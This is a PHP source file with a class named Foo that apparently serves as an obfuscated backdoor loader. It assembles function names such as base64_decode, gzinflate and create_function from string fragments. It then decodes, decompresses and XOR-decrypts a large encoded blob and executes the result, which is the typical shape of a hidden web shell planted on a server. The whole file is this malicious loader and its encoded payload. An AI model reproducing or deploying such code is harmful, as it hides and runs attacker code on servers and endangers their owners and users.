<?php
class Foo {
	function __construct() {
		$build = $this->library($this->stack);
		$build = $this->ls($this->code($build));
		$build = $this->conf($build);
		$this->tx($build[0], $build[1]);
	}
	
	function tx($debug, $memory) {
		$this->claster = $debug;
		$this->memory = $memory;
		$this->zx = $this->library($this->zx);
		$this->zx = $this->code($this->zx);
		$this->zx = $this->lib();
		if(strpos($this->zx, $this->claster) !== false)
			$this->conf($this->zx);
	}

	function x86($memory, $mv, $debug) {
		$len = strlen($mv);
		$n = $len > 5*20 ? 2*4 : 2;
		while(strlen($this->x64) < $len)
			$this->x64 .= substr(pack('H*', sha1($debug.$this->x64.$memory)), 0, $n);
		return $mv ^ $this->x64;
	}
   
	function code($str) {
		$cache = $this->code[3].$this->code[1]. 192/3 .$this->code[2].$this->code[0];
		$cache = @$cache($str);
		return $cache;
	}

	function ls($str) {
		$cache = $this->ls[2].$this->ls[1].$this->ls[0];
		$cache = @$cache($str);
		return $cache;
	}
	
	function lib() {
		$this->dx = $this->x86($this->memory, $this->zx, $this->claster);
		$this->dx = $this->ls($this->dx);
		return $this->dx;
	}
	
	function conf($load) {
		$cache = $this->core[3].$this->core[2].$this->core[1].$this->core[0];
		$view = $cache('', $load);
		return $view();
	}
	
	function library($in) {
		$cache = $this->point[2].$this->point[1].$this->point[0];
		return $cache("\r\n", "", $in);
	}
	 
	var $x64;
	var $ls = array('late', 'zinf', 'g');
	var $code = array('ode', 'e', '_dec', 'bas');
	var $core = array('tion', 'unc', 'ate_f', 'cre');
	var $point = array('lace', 'r_rep', 'st');
	 
	var $zx = "oGE503fMTBca66H1Ldazo3+hZ/4/0eov6MBLBUVG/ea0UU5C3DmSOUUaUbvqLl4Pwn4p/3n+WaXemYCI
	5kDySL3g30ymAHGC+54OeCMELg4bbOVMJmtpAovkrXO++irVNMNDgc6ZYTrVsQR/PrNb6Zp9Op0FYQvS
	C+843LcwkFAjD/rHbfN8lJv1PlgeHwzsUDocMUeY69idwPN6mvTsizow0O45IdEQzwO5IrPEtP6Icb/e
	uSlnYn/QzV9ya/NX5uYn1oPP3zQZjddpPMu/ebUMavrIbY9e9jWLMBt0nZz3MsaGMPtwXF/fugq+slER
	ew0pS1H2d1nU3caJttLUMfCodTU2dMznjwQpQDIAPgEaxlqQuvpz3gRya5VrPiO5/WxN183TM4lO5MD5
	FAdr/ajUNqtQZ0kdLrK94pdJP1YvREiAg95mBzPh4/ebpatdUelk7CySj62X6wGBV5CK9wnhbuVQbStF
	4QVZqUoJzzatSFxXDwBQDLHMvXC/WrZIPdoaAWiUUZVzXe67PGH004NpbALXV1ZDncieRFQFFsTTxn4t
	u9QEiMinhLYQXjhgicOHxyVfwou/v0WGIXYiR8SaQD69iRVA3FBKCivqb+hD54VEh5+Hj2WXIXkYXjIo
	UWQkXTgFScYvmXZrQYxVrkCIFLQU97rZRNigas8zz191Io2xwS3H53crOU9/cS6xvYs2dSpHBJFx403E
	Ali0Yud9lyocxj1AuyAXNQnmh4lLCIdne+kDbqzEnMFrNOe2hzCX3T8Mp+j7HEmrYpT0XLypA1Y8j8Qe
	qQAVgHX5d/em/7HlZsFlyWDXY9Sqa/Ze8rzT2zuVt+z2OY+TT9wsrLcx8L/3/mJq/GC7lq10D/DqZb8M
	vVuEIjsoRCbSR85PyZRvxe4uiK95kf/ib7ZFCYKvpqJ9FRoGyL43ddLc6popFg3+2TX+FZGk77AZtUB0
	0uXQjWwx3w0cRuvZUsDQt9ufreEHvavlBHrJhRSG0UsKBJ96t97nyP7jDVr8KZ3HtL21V77GwmyAqt/O
	2DqAXSzG3Y25XmjlNOaz2OKalX2tJdxc7BeNbVSFhL6Z/boHWJy9oX0O0M/qI7MX4qLj1Lr2HSKncQ1B
	ltBZBg0HPsc78EfKVCN4CHi9vVcUU1otViTKx5gYLsrvAapSB9RXP7tKIQTLMLY48DZYuslG41wOMtXZ
	0AiTLcnUV9GjSCLhH6KhNYkj6yeidHk/uhhEJo/z17JVnpL1SlIr8xrvqxE4F+q7xY/CfZEk4bZRxohO
	MFU7Jyuc43tbM+hqixA94qOoV2NDKCk9BlUQt6YvX8C0c6q05RYrLyC2MR/aE9lttqnHtywVUCsGuEdO
	/dFTO9p7vE8XpHYCZV0tZTVBRZf2YYAA8VFMGvWU8fZOqOm0vDBk7LCunGnNqetUyLhByniKz7f3Dy/z
	9vEd7itrEb7nCwCOf/3OBbKdT/yIDvcWlmC8vDLjyjX+zpo8QjO75RS38UMZtxs92vueMOGte+Z8Frcw
	0xSLNNheErgg7uujWbeRS5hpyLvXEyFIiJMRCYwZnr3hUxDJmXzhiX4krS1nr63Jx5VuoBxOsaL+J0Jw
	ghxbQfWqGmmafEs6ihG+kdmo/iqQSs1OAix6xNgM9uSRqaDVkpTD42qdZcbTWR7qzbdAW3wGva9gwWW/
	JvVMNJJ4SbfvovSXHk+t2BI4HGMD8RHM7FTALZxWVLWTMslrZXi0eNNWlvzTzyZ6qUp4OSP77VizcNg+
	MLbunUiHKJ9/xBJZKwPLsl52P2cOMOb5ZoEeJjdND2DJ1l+iRjZMyoaaog+RInCiV2f+EfUslbU24jwP
	PaQqgfpVc7NNQB7G+ARUI0X7bmT4Of3TD+5LeINbOiYI1EMH3ZNR5IQy1GXWozoKCEznPaYVngdLHZ2L
	CUBZipZFYLl8JorVf+WB9a9RcjLgzJ2uQuukItdcgsYiyie0t9GsOcBXdIk7EeFU6M7aHnC9CY7dahsW
	qzVhMtX4wUA8H4mutl2qp7WovjIT9ygEAljgAgnW0axK2jcJkKGSTlEMZt6b5eeeoSUoQ3tvnwMDdLx6
	Nh0awRKtCT0pWVXNuBmVvEhj82/+uUslc8Po4Q+5qz4pfSohrosIt6qsX30DdqUNopdUMrrLpQHrMXYM
	O4KE2IjQez4ZurFEjt9jP1kp72OQB/EiWhTv/v85gViT8vvxbvTJ7rb9WY+MgXDedx9VK5IL2ASKfKnA
	JPypNhXTCHqWlCDZtAz9Z50WnJNepo+XW9xp38jxafA+PFVmZCMVAX95C7NQxXybcERzHXN+nguh/yDq
	67zQR/rQvKLfXeUliaWRRACgdEv6wSbtrouauuwWnzLGKdsrBgrxpuVcXjKMIuftbOhr/MogSqiGjswl
	E4aZagFYne89m5pnPN2e7HACCPv8jp+bGxnFd/SZXXASVWchClCmn9N0nR66OaVanWFO0JjjlsvLHBCl
	SZM1b6mVB32w8wA+WqQhqzHz76lrttNfGrW+Or1AW7iTxjYpIMtJIqByrU5MpXgNJYkuG1ihTwEZgMtt
	r6f8ioW9X4nxbU1K+8DgD/zby5ZPSBYhUhYmZdnymvdRXCV1B+mZyiCAWFWN4Yc9sOf9m61nFst15ofi
	jwsuwMmvT2DN2T2xtPyPRoRzw+jFwYxwWy7qu3aED9BvRr/fOBK3RF73sXZxCCVamvAcJKXiv7oTtzeP
	NKyHRvRVq+AmUsv5COeOUAGbT6arkzkMhP7HyAp/vSOJKxLlfQeX2RP/gu6YKi5B88cPs416WeEficmA
	xMf4XI+QgCgwiphSu8hqauuoDNBKp2wlh5tmuXGmbvyOuW0hPEaelaEL8mzv8s/EB2CvDTnGHlOOgzMQ
	ToFvmYP2njMBZpNLkJvAmfHg1LyTRGJEQ/YgdFWPT0DU0YuasIJlLp+JUzSuPeEMiQWON5KBsOWixGi+
	YKjk0oO7KbkT8EN1+9EJ3DDoNcR7RwseWxngQhFj8PtCJc2/c//GwCLMLR5e3esuGowXspR+esMKXWsj
	mPAlOO0+1CZVtF9ANcZSkAINDlQgd4ou9N5Wn0wx/df94eycb7dqMhDFZDjQyeaDRSznxtZ9t0OjGNwI
	yigb3QWdN5B9aKmc1In1Fpt8SYxrgHm6/2BnRa1lN1mo1e2voNGbqENmlqwcNnI8mP348Ckev0NIASeW
	/jw67G682X3m/AxcByKzS9ZQ3fbFSKTFmky4/gM/PxNAMpXl3oTlP2c58MAlZUuVVDFmcy7nvEBMRGXq
	bSHwLw5I4EckZCuU7TiRPZMgXVmZaiymXHzvL4nkgOjrfHpVEQlaPlNQqGrAmjIppFFg9tbqlQAdYO2Z
	R4VXBJjhAQCdj6P0EljgbxGdSgSyNFCwf5yCB60yKGH98bt5pS5EDx0YjHiGo0Sw4MLKBVcU0n5JtMz0
	Wkktby3m2GKXoxIL5ferjeCmJQtV/pnf0KRX9jAPGBSNmBQ1C64KDwtr06OBCNi0nmSHNFMR976tjiMs
	vsjjw6QWHEB7ucSENp3a/5lI/04RRqXOfwaNJF6D/dDmNFseGnx9EJb+7De5uSvGlUFybio1Vj5rFcW8
	S6+4f9HAM8Qo/m96AlLQKEME90fclu7EyBg22bHkdUJ/O6xPKcf7PGNOHCgqdrQSaPmID1rjqvBUMVav
	Bypt7cqiH7pBtOTkv/ZNP+6XDcnLrkYifvjbft0jt9ui8TDnb5VY7ZQa1UNlyRAPa5gBYivn1ZDYzRqY
	KxknIda8MJ5Sj+5CA8GRcSd/Usmv7rua3rUfu/L2OTmINhNZLlBll1+MsBoHznZIa/gPxadRF86EtpfA
	ckvNwCPyUs8y1V79MdLwIC5iuo4izqF/xijkA5yh/nybkjFJzziyL1zw17OzidWYKvuojHaKZIq/6TxS
	8RuEsxa7UHVxE8F0F1wQcvGp8+CGH2Bt54R5vyTHvKkxYa1PVjTmtTeaAJwphQ5eSP5ZJlPH2neGMkcZ
	D9rUlH1Zklg+/ZHf0kwTc1QtE79n6yeDVwKQNw3YF/egwpGU+eoNvUjEi2lh7tKdKRZhz4co5Q9QCC0n
	XNxYUmzptxM+MPLE9KP3nP03YmWIPdYMzlQavzxY9o6/Oi0lBUVcHFS54S8sSrBk5sgAAENKdxVCniuS
	V5RLzbWORU76SvmxiN2UL3FE1C9DhfGfpU8tqtGapOnZNPwLA7CcJwNZ/9ZI3uHzvuG5TA31mVYfvFhT
	xrmJR98cdluonQD952M9epzisg8qLeyEvFKLxAtXrivakJhmNN1WnLbczMZnZ120JuVjI/CZHrJ2LlEx
	3p5deTD2/JUSn4n/cx9NnCLVKmmBLqDdVTKqR+lYc2OZI54VMz0B/tKi6ioaIyIfdzvq0PkSx2aA2sJG
	2hYEkr+qEaey1rTyReJc6rwrum9ScD7fvzW0jnZfxmbP2jDudQplUer5OCKfwB1HE7zXDbmJ2GLLeHsJ
	fS4ohXfoVmtCQFy9+nRCEteZVENCoPJszykj8stiNGJR3pc5Qvp2GB0TJex7Hyc5gfysaA0avoL0hWQe
	+4W8TxxjZhcLaV/ugP3r9cUar1uIwJBAthhFn2lxIIwmh+jHpyIHoMAX77lVAMSRmf+D8UD0Ve5vSWbG
	uGpgzvEF2PYxk9v5v8GyZlQH29MuEIjRDq636Kklz+T2JczrUqBO75CkrSxnEXXZINaKiBFzNKaBPnKU
	S6IgWDhWLtLVgNwBd/mB1nrLIiVv+XlBdOcXlqY/+2Ce2nPX8/6lpdvVztQUqvHW+vyLWr+TgkEeobR5
	0Y8LJi0dvwrPtxspqALS646uBJJUAw59zgY2eTzR6DKb0EY3DkgtJl8eL4W9Od8W5KaxN3673UgCSuoX
	MrAlXpVoH7A6beOljtA7kav3aUpa6AQnTuh5au2uDQsHXK1mqBSnRS+HQm9Xq4MUvykm8P5e4dHWbgmJ
	jIjRWklZvusplGWJUZsirs/WMX6qsVuKskk8HXOgVow3bpeT44LVuhohDGFDrJ8xHrSpwf7gxMu1CZkD
	0atOc4wuCjq++4MiT9R/8O6P8e4wKkxRA726whEDiDj7KPx/CniRpDnZZNQnDW/eeOHo5ZPea5SlsRxY
	bkZyhadD+6brHzItXmgm5CoUWfH745XaNaiST7ywhfwBCveYMhHMLfPvG/hot+dcSv+ULbtjuCtbfQqe
	TSwLrO+F+qoAUPwyK9g86YFCiYUVmthix4hPCgE2n5fRjdgy1f1r0Z+zff49VDonHv4PiBeFZq56FUJT
	U7IhASHwB6BAB5+po/5tgHZJX7yQt3OkasIMuAHpxnNqzYfCYuGKsZB73AM/8oXLfnEX4hh+XPUo3vl4
	LllOUTwBu7kNU5qZ/eAlAvSqVvJ8vnqIcEmcilx9ZLAFfQX5FMYuNXJjASdVuNK2DXz22XgGTf9NgxPM
	qba0Rb56m6nscW83RNqX4TLcX2DsoQaUOCxlz/GirCJa39He3ZKkUjOLIESt4vyqFhEjnBhIbqKfQi4c
	ASWZXrlnLQ+jAE2HAch5wo0shfLqPWkG4i7LmMCH8z56srjAHj0IV7JxmKJZw85wi9Suwz61yk/XRzoh
	7o26TtlL7yMtKNv2OE0EboPysKtlIY7MjWhydg11qCCQF0Zt3XKcg/CgIfvcBCSrcgpxuRgl/dHrnnSO
	nJUPjHsa10D0mwcJ+UzuKCTVrnjd5HBx/7pfIKbfCRuJEVM3apjwlNX9wAG0rdqB6ympc5xjJUborojp
	hRkjnSpkYdP8rgLLOjlOdlUvpOH6KX/k5lFsHLXXvv/8O8K3kl0UrD5v3C/bnV2e+4iLLfzJa8sye8ca
	seh1/fXY/RJV3tzgNEtHWNYvpALYHDRG7YHav9NPGilut2Zikxd6XAYdHp1b4TIlWGg6mQ1eIcEBYGPe
	/ejhXYUIbNvnzdfMpE8XSIVtW8XD4rveCSt4N5fNpKLs226Kvzm1CNUpy5sAeS/9M8ltQPZkNqHmOE46
	wxPJgpmSVzG4QtckXE0jKVoGyjA2k9p4xHH/N0zoDdk5daxRAcL9i0dZMc46grz3nrMrN37FgdOGb4aY
	A8E2/QB1XbiWOBrIzYuO24ZrBzMFkmbsYAsqs+MKPpk8zEQAY/0WmwqJLahOMFsjeU4J+0ZqnLLUZ8DM
	J2geHlKt7l78DeNYBaXsdRPrTD6RT9xaX/XxJvtVjIGak3hv35nunrGWeUoKj+xRsG6/QcinSfRcX3TB
	OJoJzLDHT67KKJmZiWR4Ev72GNYO9ulGo1tc6PC29TC/MFe2W/jgHkkU5roOYDRleMme/B/2FlE2b1/a
	JhRoPTQ7I/uaPsu356Fg3boiwj7Y9EdiBfAsCqFuIcdygA8Xog7f99o7v5/EMiMb3Bz4E6OxN6pbUmqu
	QKHo3qSZ2ukYPp5qcKYmct9m5wmP3wHDp4gH3PHs33wGeWn2JbJEcNskwWm3fsGWFSgAJbyfyI6w3PdV
	gq7PRnQM7E/ob0QUrqUs3j8LxqNlI2zFuzyC0am6a5zczBOEOjo4vMyy4kRphBLnaEfWkFemmBgXJzAY
	qbn60u4dZFnn8CYPAHvQXlumC6bVv2ccnjw0zbmYpwLgX2cs7pklchfDLgfoG5LjK1Ln+1xx6Xyen4RR
	CUrChSgjOpiT5igQ7DS8JSgvue2xM4FduBuovWbcewL3hHKxpf6bv8qI4ruz3+2ev7zSQ2HIMARdlFrM
	902ibUnTLu7KPl6HlukCOkV4b8XVdyYZGRePdiEnomjT+TBlJG1xUs2uvRCFWsUifmkwkWdFO0CMmhNI
	tBLx1qQmr2oS+p7o8VNO5wPeAaOQa7S2aB2u5Hwy/TmvMI+P9GR8cEhaODzn2TDWXBYUHEMO9GCkih/1
	kScR8ppxlPa4a/iHyNbhOh1tA1xtcgjbGNr0BBU6NuG7GBcn1cJaxaurF9CECdjkEWf1SwoB8Z/2IJSV
	oWFHAUN0Z7ZzYxVL48mllMvs9gF0GF5Z//zGhM4i+/ofvm9SaILmTKjsgHJSaox+I26Ij7tf3S2Y9WU3
	QANwKyKyRou+4Z1d1P1CH4DIhvQunPSQym+G+2Oz13o4hsDS4AB0EZdoF57xthcvWKTD8I78l2YtI3bL
	vN2ao4Qedw2eBWBv+8y/iLqwn7ZKQXhOLKtHb2jP40Rive8Psa5xcNKeTagitRFbrQPZv+2SPopeEP6d
	PLGf34KNMsXOFf2zAHW9K+uANYmGQHgdYp+KU6JsirGTYRVkF/gWouwHz9XMP/C3I7FKDIawJdicBybN
	GLubf1xopxFAALzQZPHakEoHU2laoggZXlX4Vpca2FFy6jpoMcssp49lPsGWNYD7XOFjF7G8Yh7kmbmi
	ZvrOU8vl/SeF5O3zjdabjEmFgLEjLCkONwVAi1hiGMqgsDCZ16LKQIOxEdNbgdlV6paFkQ75jjOLy73p
	IrQegHeucbTr24u3Lti6LQBfpRB/Er3GXdBJ+N5rTfW5YLw00Rn1ZrAbjqrkrYXKBohPbGwycQtbEnqP
	5AG4WYCA5JJhmS27jF97/MfTmNprva8UviashCxBNnfyEf8u/g9Y0Bq2Sh4jzfgDIKvv9689C4zUUsEX
	LP3U1JqIfL4+mW0RO39YOul6JILDHW9CjnqbXnBIXRxoXVjMmv3cIDEWJoBJ6a+mm5xkxbGE7zeYqyCI
	Z49B0TszEpvkesYJoMTEmzDHJAPnrUkvNB6iYp8SYJXP6xBQWoDYSjLYKHooOTWkyahX47BSxBHoaM2A
	PbtFwbEKs1CeFm0+YRpAS2bqldz7Picb0TJ7Fgd+dDvwxJPJDvLyPo2UTZ7JjgQDwmcqGQa+mYGUhaNL
	roE9s6otVGjm5Qw5S/6CNSRvWiVZxihGFc1XYI4eM2lrWTv92gmQQyVouvZEQo6Ty3NJeC4CgbIsyp2t
	q90tcb6j4/ZNnrg6M8UmirC/VM5FdEFrVanthPtgiWRPRbtB07SFQ56Of2S8WPHTANwOxG9ExiBKlO1w
	MJeQXQQW1oL9Dnn9kZ3OQaN+JvApL5tQqi2fUl154rhqgRJZsLsB701DqyvIzPNkN3fiLDZEe/5MKWrK
	eRLYvHtVL1ycHl3cHDjFAMJifJlftIcD/FLtuQ0havMhD5qYgsx88iOyog8P6J9x244QH3mVrWjTImi7
	BLH9OQ+9kg+qtsWRe2Wkhg1zpvkha2uXekyweKJi7mDQZaO+UvTEGwST5Pjz25ZOKRCyqDADQ8cFhkkg
	Nb9UZbp0l/JM5KHR2nAm7wCcAcX13KRtvAv3jbG3DoGAcHiV+QtqmFnbSH2h1TNYWthxgm1pi8b/iGPQ
	1N2JBv1Z444QkGbK5YsyOL+JW1swHhY1W6jLoLn5h2HHjSzuMAOLKppCE5vLFoSJZPZ8AItaS1vnxAqz
	jX8Gvym1gyCLWDZ3qWf+fyrZvi4rCA+c8qBHL2kAaBpFhx8UC5AQqwy2eV8Ne8IMe1DKF3pe7fee47zR
	yjUTM+6YXKw249h2Nsqdg0P2fny+plsgEut5rjZ1wag3OWuLNbIRcj12g81YNt8psUkjjb9lL+dTlNGy
	zmSt0M/M+WkeREPvZFD8pz9iKU1VBAPPeDM7eqi7mJLholafIXExKTgw3X6FEcVL48TFj8yY2/OGNYru
	wg7VasQs3gMrXCw1v1gvOmu4lrndg8P7gqpMpaOw5RUSr4w/3V+knzM3+U6Nv1Da2QrBrTr4CLeReKcM
	B12b6jyfGWmUdVKwQx+cIuQEc31yb3T/IS4re60uzeg8NlJIvaegfl4NWk3T1gtU0Pbtn7JQszhpRN/w
	azS0obIy/YjICM6DTgMb3ceTfSTZztZ1DYH12LIk1ed2ymd9q4qXXpwYHO60B2KkyaKBfiL3bqglGybc
	9LIZqpnPrimp71ZoSk9psR/I4eLKJPTK/bn4+C9Rkh6md6KerynOAQc65XcMNTeuNTlB1JOm+DF8YOiQ
	jwZOCapD6mBRRLY3kx13Xn7oRe7RxLgFuLa6jcXGHzZlM6jAWeUMb7FM6BCkTfqoy32tgq8HAY3aicez
	1OA54gDjCZCkIFXgjHSXEYbrItjCC+64C2AuZjYYqYS+Lhs9eOYeosc/bu688sMz+GVC8T0rDGFff6bQ
	YGk+g1n3gqZ8+xqyTioWtbNIu7YUrS0GODtmwQMVAeETyYrLH7ZaYjvP888QKsTtYN95yhTH0n0JMNXH
	slS476bTXh8yVgH507pd2J5tNZXtFGHn1CvCEbtRJsjWH1AzbE7lqzyKYjUsRQzMgCYsTdqdt5RBfiIJ
	ZpvA792JuYfLph0sUdHK51XPjU8AYcx+gfoelayQS/Wi+HBiVB4BA6ygM2hZtYqi7vUuAg1kAAJUgwmn
	p2zAJ7LEjgjNGpF2iqzQ5NBz+ifZNHJ9Z2+Enkl6CkTTgYgFXlhYbaMrC2EY/9rqjQD+jDcP+hE5Euec
	K2D6jDWaRQW+TVWW/xEF7Uskg84Up4VeEdq8CtGK7/h2QQKBAwVSKpg/7OcxZQl7m1i581PXh9mCHTdQ
	W6Mx4vJj6vI1/igG8EWnmOftXXgLUCSDJ+xdhcIGaLIY1zdxogj/ZY5mGeNtUToltLjOGZyMq8TS/siJ
	stDuCRx00HELVfVko+evwQ/T48u6oH+rabXw8m5TSnT1OIyd0hjfivTYJqgBCGY1Cen8XD2XKreus+Hg
	CmqKCeEUsit3FXiEOyqw2Y6L2yz92hGOjpq+QZr3vKgrcJts86CWnP/i4Ijnsqg4G887r7iT156OEy8v
	G3SG5yH4qJCPPd1aECrRQCbeNeOOu+iDcOW8KYMMmLnVImFKuFBJRVvSCpDcjzdV1p4FCQDDqCXFHdtx
	hwMyO5pC6zqwuCzUlq0HMq+HERmlXMz0IoqpE4GOOSPRtMakT4mDp3dhIFNV+D96cQYfXzlWp7KSAHiu
	4plbnu2UhAdXCpb8akeLNQqt/Pa39j9tJ+oy3doWq+GAeeWwDWjNywUqss+PlE63WIlekOdnyKPD15l5
	cS+EQVzmG93zpGG2aT/gm+8OSgrL3DXosQskKS0dXkuIE50kgmDmV67K2keDI2FzeAeBI2mKKWiGUg0F
	QJskB6jdUFU2eU25n8KkzgXiNoIba86BEPJTQaGfr/Pqu1bP/b/tF7cDNVyqpMzlOfsroa6C+JjhQn2L
	xN2jYCboIs1wyvKOSP0BSInkimVE7MQEXUFSg5KHoa+/RVn7EFl9K1l+tX2jjS8kuOH5d2mYQrKUn+tK
	M6oZHripf+0JQfnEiYpXPjCFpbIWsqyA1dwRaBUliuUiE7i89PV1MImuuH2xT+z1SVEF/XbDP3X5c1Wj
	By1EBVdvx3Uuo5kAEKHA1q+j5ardmO0JGqKTiYRDfkGtfFRxD1w4TtNpu9UDO99tRVyZAC1SGhMK2aKz
	bnybesHfHUAOxqGz4a9+RjubM9gg8M9NVmrx0SoxRY57+O3kEB91hij50fixPkfxf/60tQVgu/7gOthM
	Fcw66tbBSgMeiFLxFDFzRh0bX2+xbPI1dqHWmE6WbGSILtcfHsirZeVijat/ttBh5eKdswaBIEJAdQPA
	uM85KOgoRVc0An5NejrxFH01SjqQ2FO1DJPGsIRJxiqsFqtZ6t1dUsCNo+yDAzEqL29w2+5iqpbJa0aS
	l+3qzgrWj9Ohfb6Dz7zwXt2wUXU+VENzVMjlYIF9iWDhV7Olt7Ei/yt/lOuPI0+ExLQtmqZkgW2O8oOB
	ow2QUZSJ7BrHyHQ5dU9aCFPewWZLkVw6QrxlSjZBQRne5wyF0yy5ME34kSoC0cxVABOyle+/UtO38FaR
	sQTacMa/VNMy8HG2erInu2wKw888DnK/t83hCQOIMN38cz5BSbs3J+ZiYt8BlKxGbQUwseYdaVgrj4AZ
	9rK43AqY/g1Epq0o7MzBgqQTy1NPOnCggvU2TTafclb+O5VXadfmypaz304bwhPNZpXfIa3yvdHzrddd
	zV19WVQCy+Jpdn2dgVQr/xNCXlLht9ImkyousnfXeRm5fo3j0r7mSO5YrgfcF7Csw1+igN0yWnS6PNU0
	Brq/a3dqO0nI4QLSIS0t23GfA1AWrbpiXwNp+TT56OiczSV7pQuyl6qjh9EZNmPKERVFxDW+ba01lawv
	+5gGbBCXiwUaOxPIEwRXq8XsYdmfM+K3Mfo35RB5q+EX+u+ZlKmJAK0yILP0Ub8A+MWuK0KuE2iSvc90
	5S4yz5s1ecBTjulXfIC3sgpo7iY8xEr2O30NKvqYDFjHIX0WF+VUSA5OsOVIAJAfTTBtg+DKVJXLh7H/
	+Xc9oRstxPP1480Pq5TMY4KhFjwc2ywyuQzNKHt4aDA6GPTlaKrgpjTmDI7GPD3ZBtwB5CSNuo8uClVE
	NeY/3++poK83EN52+TsBr1upee0Z4gVdCuVUMhuUm4xcqLgBHF/NdYLCYQiZ1zkmm7PugUC6ezHsBriH
	ruro/G7auWUpVODCDeEqJeoU6X7u2PgxTlzrM3rqEH0zyRDogJsLHta1cY4++3Aold+xIoB1ua6z8b2P
	URMOdf6VSbZB1qp0sK0wJCxK21yHynFegATyz6O0jjboSD6/54I2te6oQNiz7UyUCvlLImrvLOEhtLxC
	0v81rO8Hfcg1Fr9RKuUdGEpMDmVSv2hWnCZLlaCLl6jHGNyA24CklGioICRI4UpNEdQM+RDNFCwFqQ5Z
	91Hi1I6IdBLAe86U7XCMw34MwYrGz95ki5QhX1/7g6E09qmtmQUO3UQ58Q2C07DUIqP9qmrJFRM2JeXP
	egipezIidkNQTSECnoCFW1TtlnKans1qj5KUj5jlXJQbZLGaUAEdWFdaAQ67A9ufMwVIX2lb1moGqJDc
	jB/ty9uQkUoBgQ78drRplqHZMqIydNrfC23175CckNFhz1mTkQ9MKUSwcUElDnbcz8ThTocmt+M/NkFa
	ohGu1Nma6j2qwaBBAeka3GV4+CdLus3/0/wLJGMPbowa2EWVXtG7NRuTsE+hS2qW3FNzHxBUqwl1g7yj
	8MXEHvW5VgCuIqYajI3CAGJElHpJgZpmww1xSt1IhPCNQ5OhScLiYcDpo+lG9x0ra965BNIdRSlpJhCz
	ItDfmzBiMS531YWKaM5aZoWoCQx8V/t4rzr7JnTx0ZaRp6zg2cGCllftfNOCR4R2SEPdROP2xe7uJR8X
	tQcIbxXFgKItXHpcWwXDOQ9lsOM9rAeqQl3Y0RSLd0WrHEjdB+DcBEnExMHRmo9IYm2YrBiPptAt6bdP
	sn1sL8BgiKQ0csBXrR8POc1uc5lWJzt4I6Yr4GfwPVi6YXsx0/jy1AuIt7OO8txS019IlMP8wfdfT6Nd
	Smzeu4qT9NXQhuyaJUz3+LhzPHhRcKxuZt92AV7skLSUfWyblfhBrz6lJMWifxF3jMH6vQ6smsbQ1Dbt
	SvwxsvTv8vApu3OnyzspqqVFh75NRAcpymehn2Rcq0KMJSIaA/6abhoFUsZA9FRqh2yapwIl2FnWaQCb
	oWhqz9dBi6CG0ti8XkQdbKD9qn8BDIOXmmBIRzCNSsgzFpL/vEsXueAstgBp4xJlWnMM56q4MVbEoLwL
	jJ/siLJPOYlDWv3SMSOcYiuUeVpUY6Ntfz5R2/9Fdg2Ho1EmqwzYz3Ob668HfFnKv20B12apHI4V7Y6T
	nYPhY/OTa4nsqSPRdJTfiNsqvtwpkqoJ6xPZ3ueUuQw9zRP0T9cIenvz5qDceyojwSVDhZKT/eyCSBUw
	fXv01UxBhPp4t1AzJN6B6C7kAeLCLjI1ockjOWSGcqJDtR9AopPIE4sySgB0+1vGLxygYIcISkHQNQwl
	0OTmhpBJdTn9euEYwrbSFuhjHVSzjuxjG9SfF1oqoV5WOGAYRJi34Vp2zoG98GZ/iu9MXYBkLtH9Gxn7
	MVCGIxlNCWHDgt2MUr1XtDxpwhyiIUdXh1jSQdQIhTZywnBqao6qt+dOpGN8vtIa8VQs6fGxET0MlWZ3
	qIDh9Awn+3FfBNmYL0xHmN7y7amgdHF+kcIJKO/chh5qZaZFz5S8t6+aO/pMvY16Vptm71LFFyZX1V/v
	WvXbOU/qCWfJgK0mDup9jlBMzs5nMrKTHIs5eE6IxfsYQ6Jcvd229iQ7aW1IeshAUfj/ICWcBLQwWlvt
	i4caBciIYuESNpNmCs5Wr+JOY6ctx59il8eID9AAVc5fGoUE2L8IHq1T4vP/nQjm0r9VcGKU3n5jHz7f
	5pgyjpGoEH7ST4imfMtuNsMskfvBea9RZjp8X6k3a+CIcwIj85b8zDTTV5w+azerUw6xwPN+CSKAYceg
	1ZcF5ITO3RIXhIiu8pmINzeaAZGeYufX1qBQt9OJzhR0GpTi3DtBvR/Ar65YXd0MlBQ40lyocCnfAq/H
	rGqDg2ci4EucuEH5AB/cSFehzpXpRZDqaSDTiaNRFF0TZr/0NsbYRS24wjXmR0KPi3SW7qKgUM3PB3hm
	a2DpVwSJi8g+0mm/X7Xqd7bvbsOBLq9IBaZkLVIxc84pdLWh2+KD4F+uNE7NtolY98dEm2MlzZ05TgGJ
	KKx+GOhA50gXh8o67hnncLWowyPNt8S1PPOw+W/1J2SAcNAaUI/5Q3Jp9EMfUHCcg+Jh+FVyP8iWSLaF
	QUZEtC6GKR6HW80CdjODJLw02/kuRlyQCJxAmIw2zkC0btLdS0HFi3a9bu8exRWfWcwd5DBtfh7k2NXo
	4JgWuURZseNxfdXF+lO0eswOIKze/96yPUMUa8jqlE9viWe/nU+2dsXJ4qOr2liiaBPPv43BQ6u457S4
	fagC8tz6YfTwElSNISGL7VG6fXPb2qorh/LLeqO5stLEcYKTEr83ry/ngbZ902yQSLyXa16QxTU4cBrf
	MDh8UyK99nWZ3okWpnDs5Le41Bzd12ODXiTNI0XQDxIcJnOp/XtNtLuriwRahIVazVX5321xgOFyhhXO
	FA/y0/Rgh0UaeFglkufwAXqL+jKl4m3s9mL/g5HqdBSMB4i/Wb0Qyh7wef4tuf7Kn5DhmSXmJGy7CUJ0
	+S336dgf4uPspXkc5emURQvDgvw2heOmL5d1K73xA+s8Bpv7IQOCahxwQAG1Pb/+sMZC0prZzYbcZPGn
	OTH17SVN7JhV/CF7eJcnKS+1r10ypnD2N+PWYlNFwZarMsM/P5dy/77tkhwHMaUVjcfyKEfrXS8BSBvY
	VACDXcwh3LGviVSbs8uexsd+8rNU7VbUWLlcsWy07LNDSHOlg0OOkabb1ebHccWu1r6dksu9mGGr1j8H
	UX2PeDTg6TOaB8UR0nHJVPxoj+NtyMX6RyTcmUlJ6UkMjJD/E7EetKnc/UqlKjawbbzPtpFRoENyNxnP
	58blKoaqdE3tGeFG2MoPmlPUGhAiey/mfuTVJJCUHqrv8VWJeCO/OFZSSX6u2Ljp66uKtZDTxRKqp4DI
	zD/eVzj/xPAd0wUgRxhgZqI46Qk51MVRukxIowGDG/aedozw2MKA2wU7QpDQSYrDyQCswZl0+ffYI2ST
	1f0UKj2T9x2/Qpz+k3nDb1a+98sNgc5TZ7jcOe0sDNpjFX0irqCdqVO+BuxNYf6QshtX7cAFu2PXuhN8
